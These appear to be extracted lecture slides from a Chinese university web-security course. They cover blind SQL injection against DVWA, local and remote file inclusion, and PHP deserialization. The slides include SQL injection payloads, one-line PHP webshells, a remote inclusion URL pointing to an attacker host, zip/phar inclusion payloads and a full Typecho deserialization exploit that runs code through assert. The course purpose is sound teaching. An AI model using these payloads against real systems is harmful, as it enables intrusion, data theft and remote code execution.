Ø 有一些SQL注入可以将SQL执行的结果回显，这种情况下，可以直接通过回显的结果来显示
想要查询的各类信息。
Ø 但是，实际情况中，具有回显的注入点非常罕见。在这种情况下就需要利用SQL盲注。

SQL盲注是不能通过直接显示的途径来获取数据库数据的方法。在盲注中，攻击
者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时
间不同）。一般情况下，盲注可分为三类：基于布尔SQL盲注、基于时间的SQL
盲注、基于报错的SQL盲注。

### lecture08part3-Web安全.pdf / Page 33

常用SQL函数
ü Substr函数的用法：取得字符串中指定起始位置和长度的字符串，默认是从起
始位置到结束的子串。语法为：substr( string, start_position, [ length ] )，比
如substr('目标字符串',开始位置,长度)，再如substr('This is a test', 6, 2) 将返回 'is'。
ü If函数的用法：如果满足一个条件可以赋一个需要的值。语法：
IF(expr1,expr2,expr3)，其中，expr1是判断条件，expr2和expr3是符合expr1的
自定义的返回结果，expr1为真则返回expr2，否则返回expr3。
ü Sleep函数的用法：sleep(n)让语句停留n秒时间，然后返回0，如果执行被打断，
返回1。
ü Ascii函数的用法：返回字符的ASCII码值。

### lecture08part3-Web安全.pdf / Page 34

基于布尔的SQL盲注
对于一个注入点，页面只返回True和False两种类型页面，此时可以利用基于布尔

的盲注。布尔盲注就是通过判断语句来猜解，如果判断条件正确则页面显示正常，
否则报错，这样一轮一轮猜下去直到猜对，是挺麻烦但是相对简单的盲注方式。

### lecture08part3-Web安全.pdf / Page 35

实验七：DVWA中的SQL Injection(Blind)实践
接下来，通过DVWA中提供的注入案例，进行手工盲注，目标是推测出数据库、
表和字段。手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，
但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名
字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。
第一步：判断是否存在注入，注入是字符型还是数字型
输入1，显示相应用户存在：

### lecture08part3-Web安全.pdf / Page 36

输入1' and 1=1 #，单引号为了闭合原来SQL语句中的第一个单引号，而后面的#为
了闭合后面的单引号。运行后，显示存在：
输入1 and 1=1试试？好像也行，原因？
Mysql对数值型字段输入的如果有非字符，
有默认处理，只提取前面有效数字使用
所以，也可以利用这一点来判断是否是
数值型还是字符型的注入。

输入1' and 1=2 #，显示不存在：

说明存在字符型的SQL盲注。

### lecture08part3-Web安全.pdf / Page 37

点页面右下角View Source，来查看源代码

### lecture08part3-Web安全.pdf / Page 38

第二步：猜解当前数据库名

想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。
输入1' and length(database())=1 #，显示不存在；
输入1' and length(database())=2 #，显示不存在；
输入1' and length(database())=3 #，显示不存在；
输入1' and length(database())=4 #，显示存在：

说明数据库名长度为4。

### lecture08part3-Web安全.pdf / Page 39

思考：如何获得数据库名字？一个个数据库名字尝试？何不采用二分法？
输入1' and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值
大于97（小写字母a的ascii值）；
输入1' and ascii(substr(databse(),1,1))<122 #，显示存在，说明数据库名的第一个字符的ascii
值小于122（小写字母z的ascii值）；
输入1' and ascii(substr(databse(),1,1))<109 #，显示存在，说明数据库名的第一个字符的ascii
值小于109（小写字母m的ascii值）；
输入1' and ascii(substr(databse(),1,1))<103 #，显示存在，说明数据库名的第一个字符的ascii
值小于103（小写字母g的ascii值）；
输入1' and ascii(substr(databse(),1,1))<100 #，显示不存在，说明数据库名的第一个字符的
ascii值不小于100（小写字母d的ascii值）；
输入1' and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的
ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字
母d。
…
重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。

### lecture08part3-Web安全.pdf / Page 40

第三步：猜解数据库中的表名
首先猜解数据库中表的数量：
1' and (select count (table_name) from information_schema.tables where
table_schema=database())=1 # 显示不存在
1' and (select count (table_name) from information_schema.tables where
table_schema=database() )=2 # 显示存在
说明数据库中共有两个表。

### lecture08part3-Web安全.pdf / Page 41

接着挨个猜解表名：
1' and length(substr((select table_name from information_schema.tables
where table_schema=database() limit 0,1),1))=1 # 显示不存在
1' and length(substr((select table_name from information_schema.tables
where table_schema=database() limit 0,1),1))=2 # 显示不存在
…
1' and length(substr((select table_name from information_schema.tables
where table_schema=database() limit 0,1),1))=9 # 显示存在
说明第一个表名长度为9。

### lecture08part3-Web安全.pdf / Page 42

接下来，继续用二分法来猜测表名。
1' and ascii(substr((select table_name from information_schema.tables where
table_schema=database() limit 0,1),1,1))>97 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where
table_schema=database() limit 0,1),1,1))<122 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where
table_schema=database() limit 0,1),1,1))<109 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where
table_schema=database() limit 0,1),1,1))<103 # 显示不存在
1' and ascii(substr((select table_name from information_schema.tables where
table_schema=database() limit 0,1),1,1))>103 # 显示不存在

说明第一个表的名字的第一个字符为小写字母g。
重复上述步骤，即可猜解出两个表名（guestbook、users）。

### lecture08part3-Web安全.pdf / Page 43

第四步：猜解表中的字段名
首先猜解表中字段的数量：
1’ and (select count(column_name) from information_schema.columns
where table_name= ’users’)=1# 显示不存在
…
1’ and (select count(column_name) from information_schema.columns
where table_name= ’users’)=8 # 显示存在
说明users表有8个字段。

### lecture08part3-Web安全.pdf / Page 44

接着挨个猜解字段名：
1’ and length(substr((select column_name from
information_schema.columns where table_name= ’users’ limit 0,1),1))=1
# 显示不存在
…
1’ and length(substr((select column_name from
information_schema.columns where table_name= ’users’ limit 0,1),1))=7
# 显示存在
说明users表的第一个字段为7个字符长度。
采用二分法，即可猜解出所有字段名。

第五步：猜解表中数据
继续用二分法

### lecture08part3-Web安全.pdf / Page 45

第四步：猜解表中的字段名
首先猜解表中字段的数量：
1’ and (select count(column_name) from information_schema.columns
where table_name= ’users’)=1# 显示不存在
…
1’ and (select count(column_name) from information_schema.columns
where table_name= ’users’)=8 # 显示存在
说明users表有8个字段。

### lecture08part3-Web安全.pdf / Page 46

基于时间的SQL盲注
也可以使用基于时间的SQL盲注
首先判断是否存在注入，注入是字符型还是数字型：
输入1’and sleep(5) #，感觉到明显延迟
输入1 and sleep(5) #，没有延迟
说明存在字符型的基于时间的盲注。
猜解当前数据库名字长度：
1’ and if(length(database())=1,sleep(5),1) #没有延迟
1’ and if(length(database())=4,sleep(5),1) # 明显延迟
采用二分法猜解数据库名：
1’ and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 明显延迟
以此类推，猜解表、字段和数据

### lecture08part3-Web安全.pdf / Page 47

单选题

1分

进行SQL盲注的时候，如果执行1’ and if(length(database())=4,sleep(5),3) # 存在
明显延迟，说明

A

数据库中字段个数为3

B

数据库中表的个数为5

C

当前数据库的名字长度为4

D

当前库中当前表的长度为4
提交

### lecture08part3-Web安全.pdf / Page 48

知识点四：SQL注入的防御措施

### lecture08part3-Web安全.pdf / Page 49

防御措施
由于越来越多的攻击利用了SQL注入技术，也随之产生了很多试图解决注入漏洞的方案。目前
被提出的方案有

SQL注入防御
措施

1

在服务端正式处理之前对提交数据的
合法性进行检查

2

封装客户端提交信息

3

替换或删除敏感字符/字符串

4

屏蔽出错信息

### lecture08part3-Web安全.pdf / Page 50

1. 对提交数据的合法性进行检查
方 案1被公认是最根本的解决方案，在确认客户端的输入合法之前，服务端拒绝进
行关键性的处理操作，不过这需要开发者能够以一种安全的方式来构建网络应用程
序，虽然已有大量针对在网络应用程序开发中如何安全地访问数据库的文档出版，
但仍然有很多开发者缺乏足够的安全意识，造成开发出的产品中依旧存在注入漏洞。
2. 封装客户端提交信息
案2的做法需要RDBMS的支持，目前只有Oracle采用该技术

### lecture08part3-Web安全.pdf / Page 51

3. 替换或删除敏感字符/字符串
方案3则是一种不完全的解决措施，例如，当客户端的输入为 “…ccmdmcmdd…”
时，在对敏感字符串“cmd”替换删除以后，剩下的字符正好是“…cmd…”。
4. 屏蔽出错信息
方案4是目前最常被采用的方法，很多安全文档都认为SQL注入攻击需要通过错误
信息收集信息，有些甚至声称某些特殊的任务若缺乏详细的错误信息则不能完成，
这使很多安全专家形成一种观念，即注入攻击在缺乏详细错误的情况下不能实施。
而实际上，屏蔽错误信息是在服务端处理完毕之后进行补救，攻击其实已经发生，
只是企图阻止攻击者知道攻击的结果而已。
通常，上面这些方法需要结合使用

## 来源：lecture08part4-Web安全.pdf

### lecture08part4-Web安全.pdf / Page 1

第十二章 WEB渗透实战进阶
知识点一：文件包含漏洞
知识点二：反序列化漏洞

### lecture08part4-Web安全.pdf / Page 2

知识点一：文件包含漏洞

### lecture08part4-Web安全.pdf / Page 3

文件包含
在开发web应用时，开发人员通常会将一些重复使用的代码写到单个文件中，再通过文件
包含，将这些单个文件中的代码插入到其它需要用到它们的页面中。文件包含可以极大的
提高应用开发的效率，减少开发人员的重复工作，有利于代码的维护与版本的更新。

### lecture08part4-Web安全.pdf / Page 4

把header.php内容
插入当前页面执行

### lecture08part4-Web安全.pdf / Page 5

header.php:

### lecture08part4-Web安全.pdf / Page 6

插入

### lecture08part4-Web安全.pdf / Page 7

把header.php内容
插入当前页面执行

### lecture08part4-Web安全.pdf / Page 8

问题在哪？

开发者把
要包含哪个文件
交给用户控制了

### lecture08part4-Web安全.pdf / Page 11

服务器把系统文件内容返回给浏览器

### lecture08part4-Web安全.pdf / Page 13

Ø 下面便是一个在相同的框架中引入不同功能的示例代码，该代码可以从get请求中获取到用户需要
访问的功能，并且将对应的功能文件包含进来。

Index.php:
<?php
$file = $_GET[‘func’];
include “$file”;
?>

### lecture08part4-Web安全.pdf / Page 14

本地文件包含漏洞
如果被包含文件的文件名是从用户处获得的，且没有经过恰当的检测，从而包
含了预想之外的文件，导致了文件泄露甚至是恶意代码注入，这就是文件包含
漏洞。如果被包含的文件储存在服务器上，那么对于应用来说，被包含的文件
就在本地，就称之为本地文件包含漏洞。
场景一：包含上传的合法文件
通常应用中都会有文件上传的功能，比如用户头像上传、附件上传等。
通过文件上传，攻击者将能携带有恶意代码的合法文件上传到服务器中，
由于在include等语句中，无论被包含文件的后缀名是什么，只要其中
有PHP的代码，都会将其执行。结合文件包含漏洞，可以将上传的恶意
文件引入，使其中的恶意代码得到执行。

### lecture08part4-Web安全.pdf / Page 15

场景二：包含日志文件
Web服务器往往会将用户的请求记录在一个日志文件中，以供系统管理员审查。在
Ubuntu系统下，apache默认的日志文件为/var/log/apache2/access.log。日志文件会记录
用户的ip地址、访问的url、访问时间等信息。

利用这个功能，攻击者可以：
Ø 先构造一条包含恶意代码的请求，如http://.../index.php?a=<? php
eval($_POST[‘pass’]); ?>，这一条请求会被web服务器写入日志文件中
Ø 再利用本地文件包含漏洞，如http://.../index.php?func=..../../log/apache2/access.log，
将日志文件引入，使得植入的恶意代码得到执行。

### lecture08part4-Web安全.pdf / Page 16

远程文件包含漏洞
顾名思义，如果存在文件包含漏洞，且允许被包含的文件可以通过url获取，则
称为远程文件包含漏洞。
在PHP中，有两项关于PHP打开远程文件的设置，allow_url_fopen和
allow_url_include：
Ø allow_url_fopen设置是否允许PHP通过url打开文件，默认为On；
Ø allow_url_include设置是否允许通过url打开的文件用于include等函数，默认为Off。

• allow_url_fopen是allow_url_include开启的前提条件，只有allow_url_fopen与
allow_url_include同时设置为On时，才可能存在远程文件包含漏洞。
• 出于安全考虑，这两个变量的值只能在配置文件php.ini中更改。

### lecture08part4-Web安全.pdf / Page 17

1. 包含攻击者服务器上的恶意文件
由于allow_url_fopen与 allow_url_include 是开启的，攻击者可以将
包含恶意代码的文件放在自己的服务器上，例如一个内容为<?php
eval($_POST[‘pass’]);?>的shell.txt文件，构造恶意请求
http://www.victim.com/index.php?func=http://www.hacker.com/shell.
txt，shell.txt中的恶意代码就会在目标服务器上执行。
2. 通过PHP伪协议进行包含
在PHP中，如果allow_url_fopen和allow_url_include同时开启的情况
下，include等函数支持从PHP伪协议中的php://input处获取输入
流，关于PHP伪协议的相关知识会在下面讨论，这里只关注其中
的php://input。
php://input可以访问请求的原始数据的只读流，也就是通过POST
方式发送的内容。借助PHP伪协议，攻击者直接将想要在服务器
上执行的恶意代码通过POST的方式发送给服务器就能完成攻击。

### lecture08part4-Web安全.pdf / Page 18

例如,在下面这个http数据包中，<?php eval($_POST[‘pass’]);?>就是php://input所获取到的内容。

### lecture08part4-Web安全.pdf / Page 19

单选题

1分

不属于文件包含漏洞的是

A

包含日志文件

B

包含上传的合法文件

C

包含远端URL指定的资源

D

包含用作数据库连接的公用文件
提交

### lecture08part4-Web安全.pdf / Page 20

实验一
修改php-apache2handler.ini，将allow_url_include开启。
<form action="" enctype="multipart/form-data" method="post"
name="uploadfile">上传文件：<input type="file" name="upfile" /><br>
<input type="submit" value="上传" /></form>
<?php
if( is_uploaded_file($_FILES['upfile']['tmp_name'])){
$upfile=$_FILES["upfile"];
//获取数组里面的值
$name=$upfile["name"];//上传文件的文件名
$type=$upfile["type"];//上传文件的类型
$size=$upfile["size"];//上传文件的大小
$tmp_name=$upfile["tmp_name"];//上传文件的临时存放路径

if(($type=="image/jpeg")&&($size<100000)){
//把上传的临时文件移动到up目录下面
move_uploaded_file($tmp_name,'up/'.$name);
$destination="up/".$name;
echo $destination;
}else{
echo "error file type.";
}
} ?>

### lecture08part4-Web安全.pdf / Page 21

实验一
a.php
<?php
include $_GET['page']; //The page we wish to display
?>
第一步：使用upload.php上传shell.jpg：
<?php eval($_GET['pass']);?>
第二步：访问http://127.0.0.1/a.php?page=up/shell.jpg&pass=phpinfo();

不是简单的改后缀就
行，咋办？

### lecture08part4-Web安全.pdf / Page 22

PHP伪协议
PHP 带 有 很 多 内 置 URL 风 格 的 封 装 协 议 ， 可 用 于 类 似 fopen() 、 copy() 、
file_exists() 和 filesize() 的文件系统函数，可在include命令中使用。除了这些封
装协议，还能注册自定义的封装协议。常见的协议有：
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
phar:// — PHP 归档
…………..

### lecture08part4-Web安全.pdf / Page 23

1. php://filter
php://filter 是一种元封装器，设计用于数据流打开时的筛选过
滤应用。php://filter可以读取本地文件的内容，还可以对读取的内容
进行编码处理。被include等函数包含的文件会被当作PHP文件一样
进行处理，如果被包含的文件中有PHP代码，那么PHP代码将会执行，
文件中PHP代码以外的内容，会直接返回给客户端。利用这个特性，
攻击者可以获取到web页面的源代码。为后续的渗透工作提供帮助。
下面的例子中，攻击者对index.php内容进行了base64编码，将获取
到的字符串在本地进行base64解码后就能得到index.php的内容。

### lecture08part4-Web安全.pdf / Page 24

2. phar://与zip://
phar://与zip://可以获取压缩文件内的内容，如在hack.zip的压缩
包中，有一个shell.php的文件，则可以通过phar://hack.zip/shell.php的
方式访问压缩包内的文件，zip://也是类似。这两个协议不受文件后缀
名的影响，将hack.zip改名为hack.jpg后，依然可以通过这种方式访问压
缩包内的文件。
/*常用payload*/
http://www.xxx.com/index.php?func=zip://hack.jpg%23shell.php
/*zip协议的用法为 zip://hack.jpg#shell.php，由于 # 在 http协议中有
特殊的含义，所以在发送请求时要对其进行url编码*/
http://www.xxx.com/index.php?func=phar://hack.jpg/shell.php

### lecture08part4-Web安全.pdf / Page 25

单选题

1分

不能访问文件内容的PHP伪协议是

A

php://input

B

file://

C

Zip://

D

Phar://
提交

### lecture08part4-Web安全.pdf / Page 26

知识点二：反序列化漏洞

### lecture08part4-Web安全.pdf / Page 27

1 序列化与反序列化
序列化是指将对象、数组等数据结构转化为可以储存的格式的过程。程序在运
行时，变量的值都是储存在内容中的，程序运行结束，操作系统就会将内存空
间收回，要想要将内存中的变量写入磁盘中或是通过网络传输，就需要对其进
行序列化操作，序列化能将一个对象转换成一个字符串。在PHP中，序列化后
的字符串保存了对象所有的变量，但是不会保存对象的方法，只会保存类的名
字。java、python和php等编程语言都有各自的序列化的机制。

### lecture08part4-Web安全.pdf / Page 28

序列化本质

把内存中的对象编码为
字符串（可存储/传输）

### lecture08part4-Web安全.pdf / Page 29

序列化本质

把内存中的对象编码为
字符串（可存储/传输）

### lecture08part4-Web安全.pdf / Page 30

反序列化

### lecture08part4-Web安全.pdf / Page 31

反序列化攻击

攻击者可以自己构造
序列化字符串

### lecture08part4-Web安全.pdf / Page 33

1

### lecture08part4-Web安全.pdf / Page 34

2

1

### lecture08part4-Web安全.pdf / Page 35

3

2

1

### lecture08part4-Web安全.pdf / Page 36

3
4

2

1

### lecture08part4-Web安全.pdf / Page 37

会创建一个example类的对象，并将其序列化后保存到serialize.txt中并打印到屏幕上。
/*serialize.php*/
<?php
class example{
private $message='hello world';
public function set_message($message){
$this->message=$message;
}
public function show_message(){
echo $this->message;
}
}
$object = new example();
$serialized = serialize($object);
file_put_contents('serialize.txt', $serialized);
echo $serialized;
?>

### lecture08part4-Web安全.pdf / Page 38

上述代码运行的结果为：

O:7:"example":1:{s:16:" example message";s:11:"hello world";}

O代表储存的是对象(object)，7代表类名有7个字符，example代表
类名，1代表对象中变量个数，s表示字符串，16，代表长度，
example message是类名及变量名。

### lecture08part4-Web安全.pdf / Page 39

将序列化后的字符串恢复为数据结构的过程就叫做反序列化。为了能够反序列化一个对象，
这个对象的类在执行反序列化的操作前必须已经定义过。
/*unserialize.php*/
<?php
class example{
private $message='hello world';
public function set_message($message){
$this->message=$message;
}
public function show_message(){
echo $this->message;
}
}
$serialized = file_get_contents("serialize.txt");
$object = unserialize($serialized);
$object->set_message('unserialized success');
$object->show_message();
?>
上述代码执行完后会在屏幕上打印“unserialized success”。

### lecture08part4-Web安全.pdf / Page 40

2 PHP魔术方法
PHP有一类特殊的方法，它们以__(两个下划线)开头，在特定的条件下会被调
用，例如类的构造方法__construct()，它在实例化类的时候会被调用。
下面是PHP中常见的一些魔术方法。
__construct()，类的构造函数，创建新的对象时会被调用
__destruct()，类的析构函数，当对象被销毁时会被调用
__call()，在对象中调用一个不可访问方法时会被调用
__callStatic()，用静态方式中调用一个不可访问方法时调用
__get()，读取一个不可访问属性的值时会被调用
__set()，给不可访问的属性赋值时会被调用
__isset()，当对不可访问属性调用isset()或empty()时调用
__unset()，当对不可访问属性调用unset()时被调用。
__sleep()，执行serialize()时，先会调用这个函数
__wakeup()，执行unserialize()时，先会调用这个函数
__toString()，类被当成字符串时的回应方法
__invoke()，调用函数的方式调用一个对象时的回应方法
__set_state()，调用var_export()导出类时，此静态方法会被调用。
__clone()，当对象复制完成时调用
__autoload()，尝试加载未定义的类
__debugInfo()，打印所需调试信息

### lecture08part4-Web安全.pdf / Page 41

下面是一个使用PHP魔术方法的类的示例，在反序列化时，类中的__wakeup()
方法会被调用，并输出“Hello World”

<?php
class magic{
function __wakeup(){
echo 'Hello World';
}
}
$object = new magic();
$serialized = serialize($object);
unserialize($serialized);
?>

### lecture08part4-Web安全.pdf / Page 42

3 PHP反序列化漏洞

PHP反序列化漏洞又叫PHP对象注入漏洞。
Ø在一个应用中，如果传给unserialize()的参数是用户可控
的，那么攻击者就可以通过传入一个精心构造的序列化
字符串，利用PHP魔术方法来控制对象内部的变量甚至是
函数。
Ø对这一类漏洞的利用，往往需要分析web应用的源代码。

### lecture08part4-Web安全.pdf / Page 43

下面是从一个现实场景中精简出的实例，我们将结合这个实例理解反序列化产
生的原理以及如何对其进行利用。
/*typecho.php*/
<?php
class Typecho_Db{
public function __construct($adapterName){
$adapterName = 'Typecho_Db_Adapter_' . $adapterName;
}
如果参数
}
class Typecho_Feed{
private $item;
public function __toString(){
$this->item['author']->screenName;
}
}

$adapterName是一个
对象，则字符串的拼
接会调用toString方法

### lecture08part4-Web安全.pdf / Page 44

class Typecho_Request{
private $_params = array();
private $_filter = array();
public function __get($key)
{
return $this->get($key);
}
public function get($key, $default = NULL)
{
switch (true) {
case isset($this->_params[$key]):
$value = $this->_params[$key];
break;
default:
$value = $default;
break;
}
$value = !is_array($value) && strlen($value) > 0 ? $value : $default;
return $this->_applyFilter($value);
}

### lecture08part4-Web安全.pdf / Page 45

private function _applyFilter($value)
{
if ($this->_filter) {
foreach ($this->_filter as $filter) {
$value = is_array($value) ? array_map($filter, $value) :
call_user_func($filter, $value);
}
$this->_filter = array();
}
return $value;
}
}

将第一个参数作为回
调函数，后面的参数
作为回调函数的参数

### lecture08part4-Web安全.pdf / Page 46

$config = unserialize(base64_decode($_GET['__typecho_config']));
$db = new Typecho_Db($config['adapter']);
?>
ü 该web应用通过$_GET[‘__typecho_config’]从用户处获取了反序列
化的对象，满足反序列化漏洞的基本条件，unserialize()的参数可
控，这里是漏洞的入口点。
ü 接下来，程序实例化了类Typecho_Db，类的参数是通过反序列化
得到的$config。

### lecture08part4-Web安全.pdf / Page 47

如何利用？
ü 在类Typecho_Db的构造函数中，进行了字符串拼接的操作
① 在PHP魔术方法中，如果一个类被当做字符串处理，那么类中的__toString()
方法将会被调用。
② 全局搜索，发现类Typecho_Feed中存在__toString()方法。

ü 在类Typecho_Feed的__toString()方法中，会访问类中私有变量
$item[‘author’]中的screenName
① 如果$item[‘author’]是一个对象，并且该对象没有screenName属性，那么
这个对象中的__get()，方法将会被调用
② 在Typecho_Request类中，正好定义了__get()方法。

### lecture08part4-Web安全.pdf / Page 48

如何利用？
ü 类Typecho_Request中的__get()方法会返回get()
ü get()中调用了_applyFilter()方法
ü 而在_applyFilter()中，使用了PHP的call_user_function()函数，其第
一个参数是被调用的函数，第二个参数是被调用的函数的参数
ü 在这里$filter，$value都是我们可以控制的，因此可以用来执行任意
系统命令。
ü 至此，一条完整的利用链构造成功。

### lecture08part4-Web安全.pdf / Page 49

$config = unserialize(base64_decode($_GET['__typecho_config']));
$db = new Typecho_Db($config['adapter']);
$config应该是个什么样的对象？

p $age = array(key=>value)：创建一个关联数组
p age[‘Bill’]访问key对应的value
结论：要构造一个key为adapter的array

### lecture08part4-Web安全.pdf / Page 50

array中key为”adpter”的值应该是什么呢？
考虑攻击链中，期望触发Typecho_Feed的__toString()方法
public function __toString(){
$this->item['author']->screenName;
}
因此，key为“adapter”的value应该为Typecho_Feed对象
$exp = array(
'adapter' => new Typecho_Feed()
);
echo base64_encode(serialize($exp));
?>

### lecture08part4-Web安全.pdf / Page 51

思考：如何定义类Typecho_Feed？
class Typecho_Feed{
private $item;
public function __toString(){
$this->item['author']->screenName;
}}

Item里的author应该是什么？应该是Typecho_Request对象
class Typecho_Feed
{
private $item;
public function __construct(){
$this->item = array(
'author' => new Typecho_Request(),
);
}
}

### lecture08part4-Web安全.pdf / Page 52

思考：如何定义类Typecho_Request 并成功利用？
如何充分利用screenName属性？
通过构造函数实现两个私有变量的赋值
（1）Filter[0]是要调用的函数；（2）screenName是要输入的参数。
class Typecho_Request
{
private $_params = array();
private $_filter = array();
public function __construct(){
$this->_params['screenName'] = 'phpinfo()';
$this->_filter[0] = 'assert';
}
}

### lecture08part4-Web安全.pdf / Page 53

上述代码中用到了PHP的assert()函数:
① 如果assert()函数的参数是字符串，那么该字符串会被assert()当
做PHP代码执行
② 这一点和PHP一句话木马常用的eval()函数有相似之处。
ü phpinfo();便是我们执行的PHP代码
ü 如果想要执行系统命令，将phpinfo();替换为system(‘ls’);即可。注
意最后有一个分号。

### lecture08part4-Web安全.pdf / Page 54

根据上述思路，写出对应的利用代码：

/*exp.php*/
<?php
class Typecho_Feed
{
private $item;

}

public function __construct(){
$this->item = array(
'author' => new Typecho_Request(),
);
}

### lecture08part4-Web安全.pdf / Page 55

class Typecho_Request
{
private $_params = array();
private $_filter = array();
public function __construct(){
$this->_params['screenName'] = 'phpinfo()';
$this->_filter[0] = 'assert';
}
}
$exp = array(
'adapter' => new Typecho_Feed()
);
echo base64_encode(serialize($exp));
?>

### lecture08part4-Web安全.pdf / Page 56

访问exp.php便可以获得payload
通过get请求的方式传递给typecho.php后，phpinfo()成功执行。

### lecture08part4-Web安全.pdf / Page 57

$this->_params['screenName'] = 'fopen(\'newfile.txt\', \'w\');';
$this->_filter[0] = 'assert';
试试结果如何？

